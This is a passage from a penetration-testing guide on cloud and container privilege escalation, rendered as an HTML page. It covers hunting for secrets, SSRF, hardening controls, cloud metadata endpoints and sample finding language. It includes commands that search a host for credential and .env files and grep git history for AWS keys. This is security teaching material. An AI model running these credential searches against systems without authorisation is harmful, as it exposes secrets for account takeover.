+<h3 id="81-secret-sprawl">8.1 Secret Sprawl<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#81-secret-sprawl" class="internal internal-link"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
+<p>Search everywhere:</p>
+<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="bash" data-theme="github-light github-dark"><code data-language="bash" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;" data-token-type="comment"># Hosts</span></span>
+<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;" data-token-type="function">find</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> /</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;" data-token-type="value"> -name</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> &quot;*.tfstate&quot;</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;" data-token-type="value"> -o</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;" data-token-type="value"> -name</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> &quot;.env&quot;</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;" data-token-type="value"> -o</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;" data-token-type="value"> -name</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> &quot;credentials&quot;</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;" data-token-type="operator"> 2></span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string">/dev/null</span></span>
+<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;" data-token-type="comment"># Git history</span></span>
+<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;" data-token-type="function">git</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> log</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;" data-token-type="value"> -p</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;" data-token-type="operator"> |</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;" data-token-type="function"> grep</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;" data-token-type="value"> -i</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> akia</span></span></code></pre></figure>
+<h3 id="82-confused-deputy--ssrf">8.2 Confused Deputy / SSRF<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#82-confused-deputy--ssrf" class="internal internal-link"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
+<p>App with cloud HTTP client → metadata or internal admin APIs.</p>
+<h3 id="83-over-privileged-compute">8.3 Over-Privileged Compute<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#83-over-privileged-compute" class="internal internal-link"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
+<p>One EC2/GCE/Azure VM role used by many apps → single SSRF = wide blast radius. Prefer per-app roles.</p>
+<h3 id="84-control-plane-vs-data-plane">8.4 Control Plane vs Data Plane<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#84-control-plane-vs-data-plane" class="internal internal-link"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
+<p>Sometimes you cannot list IAM but can read all S3/Key Vault — still critical business impact.</p>
+<hr/>
+<h2 id="9-detection--hardening">9. Detection &amp; Hardening<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#9-detection--hardening" class="internal internal-link"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h2>
+<h3 id="91-cloud">9.1 Cloud<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#91-cloud" class="internal internal-link"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div class="table-container"><table><thead><tr><th>Control</th><th>Purpose</th></tr></thead><tbody><tr><td>IMDSv2 + hop limit</td><td>Reduce SSRF cred theft</td></tr><tr><td>SCP / Azure Policy / Org Policy</td><td>Guardrails</td></tr><tr><td>Break-glass only for admin</td><td>Reduce standing priv</td></tr><tr><td>CloudTrail / Activity Logs / Admin Activity</td><td>Forensics</td></tr><tr><td>Just-in-time privileged access</td><td>PIM / IAM Identity Center</td></tr><tr><td>Secret scanning + short-lived creds</td><td>Limit leak value</td></tr></tbody></table></div>
+<h3 id="92-containers--k8s">9.2 Containers / K8s<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#92-containers--k8s" class="internal internal-link"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
+<ul>
+<li>No privileged pods by policy (PSS/PSA, OPA/Gatekeeper, Kyverno)</li>
+<li>No docker.sock mounts</li>
+<li>Drop capabilities; read-only root FS</li>
+<li>Disable automount SA token where unneeded</li>
+<li>Least-privilege RBAC; no cluster-admin bindings for apps</li>
+<li>Network policies; secrets encryption at rest</li>
+</ul>
+<h3 id="93-cicd">9.3 CI/CD<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#93-cicd" class="internal internal-link"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
+<ul>
+<li>Pin actions by SHA</li>
+<li>Segregate prod secrets</li>
+<li>Ephemeral, non-privileged runners</li>
+<li>Required reviews + protected branches</li>
+<li>OIDC with constrained trust conditions</li>
+</ul>
+<hr/>
+<h2 id="10-references">10. References<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#10-references" class="internal internal-link"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h2>
+<ul>
+<li><a href="https://cloud.hacktricks.xyz/" class="external external-link">HackTricks Cloud<svg aria-hidden="true" class="external-icon" style="max-width:0.8em;max-height:0.8em;" viewBox="0 0 512 512"><path d="M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z"></path></svg></a></li>
+<li><a href="https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/" class="external external-link">Rhino Security — AWS IAM Priv Esc<svg aria-hidden="true" class="external-icon" style="max-width:0.8em;max-height:0.8em;" viewBox="0 0 512 512"><path d="M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z"></path></svg></a></li>
+<li><a href="https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html" class="external external-link">AWS IMDSv2<svg aria-hidden="true" class="external-icon" style="max-width:0.8em;max-height:0.8em;" viewBox="0 0 512 512"><path d="M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z"></path></svg></a></li>
+<li><a href="https://learn.microsoft.com/en-us/azure/role-based-access-control/overview" class="external external-link">Microsoft — Azure RBAC<svg aria-hidden="true" class="external-icon" style="max-width:0.8em;max-height:0.8em;" viewBox="0 0 512 512"><path d="M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z"></path></svg></a></li>
+<li><a href="https://learn.microsoft.com/en-us/entra/identity/managed-identities-azure-resources/overview" class="external external-link">Microsoft — Managed identities<svg aria-hidden="true" class="external-icon" style="max-width:0.8em;max-height:0.8em;" viewBox="0 0 512 512"><path d="M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z"></path></svg></a></li>
+<li><a href="https://cloud.google.com/iam/docs" class="external external-link">GCP IAM docs<svg aria-hidden="true" class="external-icon" style="max-width:0.8em;max-height:0.8em;" viewBox="0 0 512 512"><path d="M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z"></path></svg></a></li>
+<li><a href="https://kubernetes.io/docs/concepts/security/" class="external external-link">Kubernetes Security Checklist<svg aria-hidden="true" class="external-icon" style="max-width:0.8em;max-height:0.8em;" viewBox="0 0 512 512"><path d="M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z"></path></svg></a></li>
+<li><a href="https://attack.mitre.org/matrices/enterprise/containers/" class="external external-link">MITRE ATT&amp;CK Containers<svg aria-hidden="true" class="external-icon" style="max-width:0.8em;max-height:0.8em;" viewBox="0 0 512 512"><path d="M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z"></path></svg></a></li>
+<li><a href="https://owasp.org/www-project-top-10-ci-cd-security-risks/" class="external external-link">OWASP CI/CD Security Top 10<svg aria-hidden="true" class="external-icon" style="max-width:0.8em;max-height:0.8em;" viewBox="0 0 512 512"><path d="M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z"></path></svg></a></li>
+<li><a href="https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions" class="external external-link">GitHub — Security hardening for GitHub Actions<svg aria-hidden="true" class="external-icon" style="max-width:0.8em;max-height:0.8em;" viewBox="0 0 512 512"><path d="M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z"></path></svg></a></li>
+<li><a href="https://github.com/RhinoSecurityLabs/pacu" class="external external-link">Pacu<svg aria-hidden="true" class="external-icon" style="max-width:0.8em;max-height:0.8em;" viewBox="0 0 512 512"><path d="M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z"></path></svg></a></li>
+<li><a href="https://github.com/inguardians/peirates" class="external external-link">Peirates<svg aria-hidden="true" class="external-icon" style="max-width:0.8em;max-height:0.8em;" viewBox="0 0 512 512"><path d="M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z"></path></svg></a></li>
+</ul>
+<hr/>
+<h2 id="appendix-a-quick-metadata-endpoints">Appendix A: Quick Metadata Endpoints<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#appendix-a-quick-metadata-endpoints" class="internal internal-link"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h2>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div class="table-container"><table><thead><tr><th>Cloud</th><th>Endpoint</th><th>Header</th></tr></thead><tbody><tr><td>AWS</td><td><code>http://169.254.169.254/</code></td><td>IMDSv2 token</td></tr><tr><td>Azure</td><td><code>http://169.254.169.254/metadata/</code></td><td><code>Metadata: true</code></td></tr><tr><td>GCP</td><td><code>http://metadata.google.internal/</code></td><td><code>Metadata-Flavor: Google</code></td></tr></tbody></table></div>
+<h2 id="appendix-b-engagement-safety">Appendix B: Engagement Safety<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#appendix-b-engagement-safety" class="internal internal-link"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h2>
+<ul>
+<li>Disable destructive IAM changes unless approved</li>
+<li>Prefer read-only enumeration roles first</li>
+<li>Snapshot / ticket before creating admin users</li>
+<li>Never leave backdoor access keys</li>
+</ul>
+<h2 id="appendix-c-sample-finding-language">Appendix C: Sample Finding Language<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#appendix-c-sample-finding-language" class="internal internal-link"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h2>
+<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="text" data-theme="github-light github-dark"><code data-language="text" data-theme="github-light github-dark" style="display:grid;"><span data-line><span>[Critical] EC2 instance role admin-equivalent via iam:PassRole + lambda:CreateFunction</span></span>
+<span data-line><span>Evidence: aws iam simulation + successful function create in non-prod</span></span>
+<span data-line><span>Impact: Full account takeover potential</span></span>
+<span data-line><span>Remediation: Remove PassRole to privileged roles; permission boundaries; SCP deny</span></span></code></pre></figure>
+<hr/>
+<p><em>End of File 06 — Modern Cloud and Container Privilege Escalation</em><br/>
+<em>Related: File 02 (Docker/LXD host), File 07 (cloud/K8s tools)</em></p></div></article><hr/><div class="page-footer"></div></div><div class="right sidebar"><div class="graph"><h3>Graph View</h3><div class="graph-outer"><div class="graph-container" data-cfg="{&quot;drag&quot;:true,&quot;zoom&quot;:true,&quot;depth&quot;:1,&quot;scale&quot;:1.1,&quot;repelForce&quot;:0.5,&quot;centerForce&quot;:0.3,&quot;linkDistance&quot;:30,&quot;fontSize&quot;:0.6,&quot;opacityScale&quot;:1,&quot;showTags&quot;:true,&quot;removeTags&quot;:[],&quot;focusOnHover&quot;:false,&quot;enableRadial&quot;:false,&quot;enable&quot;:true}"></div><button class="global-graph-icon" aria-label="Global Graph"><svg version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewBox="0 0 55 55" fill="currentColor" xml:space="preserve"><path d="M49,0c-3.309,0-6,2.691-6,6c0,1.035,0.263,2.009,0.726,2.86l-9.829,9.829C32.542,17.634,30.846,17,29,17
+                s-3.542,0.634-4.898,1.688l-7.669-7.669C16.785,10.424,17,9.74,17,9c0-2.206-1.794-4-4-4S9,6.794,9,9s1.794,4,4,4
+                c0.74,0,1.424-0.215,2.019-0.567l7.669,7.669C21.634,21.458,21,23.154,21,25s0.634,3.542,1.688,4.897L10.024,42.562
+                C8.958,41.595,7.549,41,6,41c-3.309,0-6,2.691-6,6s2.691,6,6,6s6-2.691,6-6c0-1.035-0.263-2.009-0.726-2.86l12.829-12.829
+                c1.106,0.86,2.44,1.436,3.898,1.619v10.16c-2.833,0.478-5,2.942-5,5.91c0,3.309,2.691,6,6,6s6-2.691,6-6c0-2.967-2.167-5.431-5-5.91
+                v-10.16c1.458-0.183,2.792-0.759,3.898-1.619l7.669,7.669C41.215,39.576,41,40.26,41,41c0,2.206,1.794,4,4,4s4-1.794,4-4
+                s-1.794-4-4-4c-0.74,0-1.424,0.215-2.019,0.567l-7.669-7.669C36.366,28.542,37,26.846,37,25s-0.634-3.542-1.688-4.897l9.665-9.665
+                C46.042,11.405,47.451,12,49,12c3.309,0,6-2.691,6-6S52.309,0,49,0z M11,9c0-1.103,0.897-2,2-2s2,0.897,2,2s-0.897,2-2,2
+                S11,10.103,11,9z M6,51c-2.206,0-4-1.794-4-4s1.794-4,4-4s4,1.794,4,4S8.206,51,6,51z M33,49c0,2.206-1.794,4-4,4s-4-1.794-4-4
+                s1.794-4,4-4S33,46.794,33,49z M29,31c-3.309,0-6-2.691-6-6s2.691-6,6-6s6,2.691,6,6S32.309,31,29,31z M47,41c0,1.103-0.897,2-2,2
+                s-2-0.897-2-2s0.897-2,2-2S47,39.897,47,41z M49,10c-2.206,0-4-1.794-4-4s1.794-4,4-4s4,1.794,4,4S51.206,10,49,10z"></path></svg></button></div><div class="global-graph-outer"><div class="global-graph-container" data-cfg="{&quot;drag&quot;:true,&quot;zoom&quot;:true,&quot;depth&quot;:-1,&quot;scale&quot;:0.9,&quot;repelForce&quot;:0.5,&quot;centerForce&quot;:0.2,&quot;linkDistance&quot;:30,&quot;fontSize&quot;:0.6,&quot;opacityScale&quot;:1,&quot;showTags&quot;:false,&quot;removeTags&quot;:[],&quot;focusOnHover&quot;:true,&quot;enableRadial&quot;:true,&quot;enable&quot;:true}"></div></div></div><div class="toc"><button type="button" class="toc-header" aria-controls="toc-288" aria-expanded="true"><h3>Table of Contents</h3><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="fold"><polyline points="6 9 12 15 18 9"></polyline></svg></button><ul id="list-0" class="toc-content overflow"><li class="depth-0"><a href="#modern-cloud-and-container-privilege-escalation" data-for="modern-cloud-and-container-privilege-escalation">Modern Cloud and Container Privilege Escalation</a></li><li class="depth-1"><a href="#table-of-contents" data-for="table-of-contents">Table of Contents</a></li><li class="depth-1"><a href="#1-cloud-privesc-mindset" data-for="1-cloud-privesc-mindset">1. Cloud Privesc Mindset</a></li><li class="depth-2"><a href="#11-differences-from-host-privesc" data-for="11-differences-from-host-privesc">1.1 Differences From Host Privesc</a></li><li class="depth-2"><a href="#12-universal-playbook" data-for="12-universal-playbook">1.2 Universal Playbook</a></li><li class="depth-2"><a href="#13-metadata-service-warning" data-for="13-metadata-service-warning">1.3 Metadata Service Warning</a></li><li class="depth-1"><a href="#2-aws-privilege-escalation" data-for="2-aws-privilege-escalation">2. AWS Privilege Escalation</a></li><li class="depth-2"><a href="#21-identity-types" data-for="21-identity-types">2.1 Identity Types</a></li><li class="depth-2"><a href="#22-ec2-instance-metadata" data-for="22-ec2-instance-metadata">2.2 EC2 Instance Metadata</a></li><li class="depth-2"><a href="#23-ssrf--metadata" data-for="23-ssrf--metadata">2.3 SSRF → Metadata</a></li><li class="depth-2"><a href="#24-core-enumeration" data-for="24-core-enumeration">2.4 Core Enumeration</a></li><li class="depth-2"><a href="#25-common-iam-privilege-escalation-patterns" data-for="25-common-iam-privilege-escalation-patterns">2.5 Common IAM Privilege Escalation Patterns</a></li><li class="depth-2"><a href="#26-s3" data-for="26-s3">2.6 S3</a></li><li class="depth-2"><a href="#27-lambda" data-for="27-lambda">2.7 Lambda</a></li><li class="depth-2"><a href="#28-secrets-manager--ssm-parameter-store" data-for="28-secrets-manager--ssm-parameter-store">2.8 Secrets Manager / SSM Parameter Store</a></li><li class="depth-2"><a href="#29-ebs--snapshots--ami" data-for="29-ebs--snapshots--ami">2.9 EBS / Snapshots / AMI</a></li><li class="depth-2"><a href="#210-organizations--lateral" data-for="210-organizations--lateral">2.10 Organizations &amp; Lateral</a></li><li class="depth-2"><a href="#211-tools" data-for="211-tools">2.11 Tools</a></li><li class="depth-1"><a href="#3-azure--entra-id-privilege-escalation" data-for="3-azure--entra-id-privilege-escalation">3. Azure / Entra ID Privilege Escalation</a></li><li class="depth-2"><a href="#31-identity-plane-vs-azure-rm" data-for="31-identity-plane-vs-azure-rm">3.1 Identity Plane vs Azure RM</a></li><li class="depth-2"><a href="#32-service-principals--app-registrings" data-for="32-service-principals--app-registrings">3.2 Service Principals &amp; App Registrings</a></li><li class="depth-2"><a href="#33-managed-identities" data-for="33-managed-identities">3.3 Managed Identities</a></li><li class="depth-2"><a href="#34-high-value-entra-roles" data-for="34-high-value-entra-roles">3.4 High-Value Entra Roles</a></li><li class="depth-2"><a href="#35-app-permission-abuse" data-for="35-app-permission-abuse">3.5 App Permission Abuse</a></li><li class="depth-2"><a href="#36-azure-rbac" data-for="36-azure-rbac">3.6 Azure RBAC</a></li><li class="depth-2"><a href="#37-key-vault" data-for="37-key-vault">3.7 Key Vault</a></li><li class="depth-2"><a href="#38-vm-run-command--extensions" data-for="38-vm-run-command--extensions">3.8 VM Run Command / Extensions</a></li><li class="depth-2"><a href="#39-token-theft" data-for="39-token-theft">3.9 Token Theft</a></li><li class="depth-2"><a href="#310-tools" data-for="310-tools">3.10 Tools</a></li><li class="depth-1"><a href="#4-gcp-privilege-escalation" data-for="4-gcp-privilege-escalation">4. GCP Privilege Escalation</a></li><li class="depth-2"><a href="#41-identities" data-for="41-identities">4.1 Identities</a></li><li class="depth-2"><a href="#42-metadata-credentials" data-for="42-metadata-credentials">4.2 Metadata Credentials</a></li><li class="depth-2"><a href="#43-enumeration" data-for="43-enumeration">4.3 Enumeration</a></li><li class="depth-2"><a href="#44-common-privesc-themes" data-for="44-common-privesc-themes">4.4 Common Privesc Themes</a></li><li class="depth-2"><a href="#45-service-account-impersonation" data-for="45-service-account-impersonation">4.5 Service Account Impersonation</a></li><li class="depth-2"><a href="#46-cloud-storage" data-for="46-cloud-storage">4.6 Cloud Storage</a></li><li class="depth-2"><a href="#47-cloud-functions--run" data-for="47-cloud-functions--run">4.7 Cloud Functions / Run</a></li><li class="depth-2"><a href="#48-tools" data-for="48-tools">4.8 Tools</a></li><li class="depth-1"><a href="#5-container-escape-techniques" data-for="5-container-escape-techniques">5. Container Escape Techniques</a></li><li class="depth-2"><a href="#51-am-i-in-a-container" data-for="51-am-i-in-a-container">5.1 Am I in a Container?</a></li><li class="depth-2"><a href="#52-privileged-containers" data-for="52-privileged-containers">5.2 Privileged Containers</a></li><li class="depth-2"><a href="#53-docker-socket-mount" data-for="53-docker-socket-mount">5.3 Docker Socket Mount</a></li><li class="depth-2"><a href="#54-dangerous-capabilities" data-for="54-dangerous-capabilities">5.4 Dangerous Capabilities</a></li><li class="depth-2"><a href="#55-host-pid--network--ipc-namespaces" data-for="55-host-pid--network--ipc-namespaces">5.5 Host PID / Network / IPC Namespaces</a></li><li class="depth-2"><a href="#56-writable-host-mounts" data-for="56-writable-host-mounts">5.6 Writable Host Mounts</a></li><li class="depth-2"><a href="#57-cgroups-release_agent-historical-class" data-for="57-cgroups-release_agent-historical-class">5.7 cgroups release_agent (Historical Class)</a></li><li class="depth-2"><a href="#58-runc--container-runtime-cves" data-for="58-runc--container-runtime-cves">5.8 Runc / Container Runtime CVEs</a></li><li class="depth-2"><a href="#59-detection-notes" data-for="59-detection-notes">5.9 Detection Notes</a></li><li class="depth-1"><a href="#6-kubernetes-privilege-escalation" data-for="6-kubernetes-privilege-escalation">6. Kubernetes Privilege Escalation</a></li><li class="depth-2"><a href="#61-service-account-tokens" data-for="61-service-account-tokens">6.1 Service Account Tokens</a></li><li class="depth-2"><a href="#62-permission-discovery" data-for="62-permission-discovery">6.2 Permission Discovery</a></li><li class="depth-2"><a href="#63-dangerous-rbac-permissions" data-for="63-dangerous-rbac-permissions">6.3 Dangerous RBAC Permissions</a></li><li class="depth-2"><a href="#64-privileged-pod--node" data-for="64-privileged-pod--node">6.4 Privileged Pod → Node</a></li><li class="depth-2"><a href="#65-podexec-into-privileged-workloads" data-for="65-podexec-into-privileged-workloads">6.5 pod/exec into Privileged Workloads</a></li><li class="depth-2"><a href="#66-etcd--api-server-exposure" data-for="66-etcd--api-server-exposure">6.6 etcd / API Server Exposure</a></li><li class="depth-2"><a href="#67-secrets--configmaps" data-for="67-secrets--configmaps">6.7 Secrets &amp; ConfigMaps</a></li><li class="depth-2"><a href="#68-cloud-provider-iam-via-nodes" data-for="68-cloud-provider-iam-via-nodes">6.8 Cloud Provider IAM via Nodes</a></li><li class="depth-2"><a href="#69-tools" data-for="69-tools">6.9 Tools</a></li><li class="depth-1"><a href="#7-cicd-pipeline-attacks" data-for="7-cicd-pipeline-attacks">7. CI/CD Pipeline Attacks</a></li><li class="depth-2"><a href="#71-why-cicd-is-a-privilege-nexus" data-for="71-why-cicd-is-a-privilege-nexus">7.1 Why CI/CD Is a Privilege Nexus</a></li><li class="depth-2"><a href="#72-github-actions" data-for="72-github-actions">7.2 GitHub Actions</a></li><li class="depth-2"><a href="#73-jenkins" data-for="73-jenkins">7.3 Jenkins</a></li><li class="depth-2"><a href="#74-gitlab-ci" data-for="74-gitlab-ci">7.4 GitLab CI</a></li><li class="depth-2"><a href="#75-general-cicd-privesc-flow" data-for="75-general-cicd-privesc-flow">7.5 General CI/CD Privesc Flow</a></li><li class="depth-2"><a href="#76-supply-chain-notes" data-for="76-supply-chain-notes">7.6 Supply Chain Notes</a></li><li class="depth-1"><a href="#8-cross-cutting-patterns" data-for="8-cross-cutting-patterns">8. Cross-Cutting Patterns</a></li><li class="depth-2"><a href="#81-secret-sprawl" data-for="81-secret-sprawl">8.1 Secret Sprawl</a></li><li class="depth-2"><a href="#82-confused-deputy--ssrf" data-for="82-confused-deputy--ssrf">8.2 Confused Deputy / SSRF</a></li><li class="depth-2"><a href="#83-over-privileged-compute" data-for="83-over-privileged-compute">8.3 Over-Privileged Compute</a></li><li class="depth-2"><a href="#84-control-plane-vs-data-plane" data-for="84-control-plane-vs-data-plane">8.4 Control Plane vs Data Plane</a></li><li class="depth-1"><a href="#9-detection--hardening" data-for="9-detection--hardening">9. Detection &amp; Hardening</a></li><li class="depth-2"><a href="#91-cloud" data-for="91-cloud">9.1 Cloud</a></li><li class="depth-2"><a href="#92-containers--k8s" data-for="92-containers--k8s">9.2 Containers / K8s</a></li><li class="depth-2"><a href="#93-cicd" data-for="93-cicd">9.3 CI/CD</a></li><li class="depth-1"><a href="#10-references" data-for="10-references">10. References</a></li><li class="depth-1"><a href="#appendix-a-quick-metadata-endpoints" data-for="appendix-a-quick-metadata-endpoints">Appendix A: Quick Metadata Endpoints</a></li><li class="depth-1"><a href="#appendix-b-engagement-safety" data-for="appendix-b-engagement-safety">Appendix B: 